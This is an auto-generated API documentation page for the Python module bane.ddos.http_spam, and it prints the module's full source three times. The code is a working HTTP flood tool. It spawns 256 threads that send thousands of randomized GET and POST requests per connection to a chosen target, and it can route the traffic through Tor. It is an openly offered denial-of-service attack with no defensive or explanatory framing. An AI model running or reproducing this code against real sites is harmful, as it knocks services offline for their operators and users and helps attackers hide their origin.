<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.ddos.http_spam</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.ddos.utils import *

class http_spam(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        method=3,
        threads_daemon=True,
        paths=[&#34;/&#34;],
        threads=256,
        post_min=5,
        post_max=10,
        post_field_max=100,
        post_field_min=50,
        timeout=5,
        round_min=1000,
        round_max=10000,
        interval=0.001,
        duration=60,
        logs=False,
        tor=False,
    ):
        self.logs = logs
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.method = method
        self.stop = False
        self.counter = 0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.interval = interval
        self.round_min = round_min
        self.round_max = round_max
        self.paths = paths
        self.post_min = post_min
        self.post_max = post_max
        self.post_field_max = post_field_max
        self.post_field_min = post_field_min
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout = self.timeout
                    if self.tor == True:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                    s.connect((self.target, self.port))
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    for l in range(random.randint(self.round_min, self.round_max)):
                        if self.method == 3:
                            ty = random.randint(1, 2)
                        else:
                            ty = self.method
                        if ty == 1:
                            req = &#34;GET&#34;
                        else:
                            req = &#34;POST&#34;
                        m = setup_http_packet(
                            self.target,
                            ty,
                            self.paths,
                            self.post_field_min,
                            self.post_field_max,
                            self.post_min,
                            self.post_max,
                            self.cookie,
                            self.user_agents,
                        )
                        try:
                            if self.stop == True:
                                break
                            s.send(m.encode(&#34;utf-8&#34;))
                            self.counter += 1
                            if self.logs == True:
                                sys.stdout.write(
                                    &#34;\rRequest: {} | Type: {} | Bytes: {}   &#34;.format(
                                        self.counter, req, len(m)
                                    )
                                )
                                sys.stdout.flush()
                                # print(&#34;Request: {} | Type: {} | Bytes: {}&#34;.format(http_counter,req,len(m)))
                            time.sleep(self.interval)
                        except:
                            break
                        time.sleep(self.interval)
                    s.close()
                except:
                    pass
                time.sleep(0.1)
            self.kill()
        except:
            pass</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.ddos.http_spam.http_spam"><code class="flex name class">
<span>class <span class="ident">http_spam</span></span>
<span>(</span><span>u, p=80, cookie=None, user_agents=None, method=3, threads_daemon=True, paths=['/'], threads=256, post_min=5, post_max=10, post_field_max=100, post_field_min=50, timeout=5, round_min=1000, round_max=10000, interval=0.001, duration=60, logs=False, tor=False)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class http_spam(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        method=3,
        threads_daemon=True,
        paths=[&#34;/&#34;],
        threads=256,
        post_min=5,
        post_max=10,
        post_field_max=100,
        post_field_min=50,
        timeout=5,
        round_min=1000,
        round_max=10000,
        interval=0.001,
        duration=60,
        logs=False,
        tor=False,
    ):
        self.logs = logs
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.method = method
        self.stop = False
        self.counter = 0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.interval = interval
        self.round_min = round_min
        self.round_max = round_max
        self.paths = paths
        self.post_min = post_min
        self.post_max = post_max
        self.post_field_max = post_field_max
        self.post_field_min = post_field_min
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout = self.timeout
                    if self.tor == True:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                    s.connect((self.target, self.port))
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    for l in range(random.randint(self.round_min, self.round_max)):
                        if self.method == 3:
                            ty = random.randint(1, 2)
                        else:
                            ty = self.method
                        if ty == 1:
                            req = &#34;GET&#34;
                        else:
                            req = &#34;POST&#34;
                        m = setup_http_packet(
                            self.target,
                            ty,
                            self.paths,
                            self.post_field_min,
                            self.post_field_max,
                            self.post_min,
                            self.post_max,
                            self.cookie,
                            self.user_agents,
                        )
                        try:
                            if self.stop == True:
                                break
                            s.send(m.encode(&#34;utf-8&#34;))
                            self.counter += 1
                            if self.logs == True:
                                sys.stdout.write(
                                    &#34;\rRequest: {} | Type: {} | Bytes: {}   &#34;.format(
                                        self.counter, req, len(m)
                                    )
                                )
                                sys.stdout.flush()
                                # print(&#34;Request: {} | Type: {} | Bytes: {}&#34;.format(http_counter,req,len(m)))
                            time.sleep(self.interval)
                        except:
                            break
                        time.sleep(self.interval)
                    s.close()
                except:
                    pass
                time.sleep(0.1)
            self.kill()
        except:
            pass</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="bane.ddos.utils.DDoS_Class" href="utils.html#bane.ddos.utils.DDoS_Class">DDoS_Class</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="bane.ddos.http_spam.http_spam.attack"><code class="name flex">
<span>def <span class="ident">attack</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attack(self):
    try:
        time.sleep(1)
        while True:
            if (
                int(time.time() - self.start) &gt;= self.duration
            ):  # this is a safety mechanism so the attack won&#39;t run forever
                break
            if self.stop == True:
                break
            try:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                if self.tor == False:
                    s.settimeout = self.timeout
                if self.tor == True:
                    s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                s.connect((self.target, self.port))
                if (self.port == 443) or (self.port == 8443):
                    s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                for l in range(random.randint(self.round_min, self.round_max)):
                    if self.method == 3:
                        ty = random.randint(1, 2)
                    else:
                        ty = self.method
                    if ty == 1:
                        req = &#34;GET&#34;
                    else:
                        req = &#34;POST&#34;
                    m = setup_http_packet(
                        self.target,
                        ty,
                        self.paths,
                        self.post_field_min,
                        self.post_field_max,
                        self.post_min,
                        self.post_max,
                        self.cookie,
                        self.user_agents,
                    )
                    try:
                        if self.stop == True:
                            break
                        s.send(m.encode(&#34;utf-8&#34;))
                        self.counter += 1
                        if self.logs == True:
                            sys.stdout.write(
                                &#34;\rRequest: {} | Type: {} | Bytes: {}   &#34;.format(
                                    self.counter, req, len(m)
                                )
                            )
                            sys.stdout.flush()
                            # print(&#34;Request: {} | Type: {} | Bytes: {}&#34;.format(http_counter,req,len(m)))
                        time.sleep(self.interval)
                    except:
                        break
                    time.sleep(self.interval)
                s.close()
            except:
                pass
            time.sleep(0.1)
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.ddos" href="index.md">bane.ddos</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.ddos.http_spam.http_spam" href="#bane.ddos.http_spam.http_spam">http_spam</a></code></h4>
<ul class="">
<li><code><a title="bane.ddos.http_spam.http_spam.attack" href="#bane.ddos.http_spam.http_spam.attack">attack</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>